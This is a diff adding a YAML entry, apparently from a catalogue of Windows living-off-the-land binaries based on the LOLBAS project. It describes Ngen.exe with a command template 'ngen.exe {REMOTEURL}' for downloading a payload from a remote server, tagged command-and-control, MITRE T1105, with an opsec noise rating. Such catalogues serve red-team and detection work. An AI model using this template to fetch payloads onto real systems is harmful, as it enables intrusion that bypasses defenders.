@@ -1,0 +1,27 @@
+id: lolbas/ngen/download/0
+type: binary
+platform: windows
+name: Ngen.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+commands:
+- template: ngen.exe {REMOTEURL}
+  comment: Downloads payload from remote server using the Microsoft Native Image Generator utility.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ngen/
+tags:
+- windows
+- lolbas
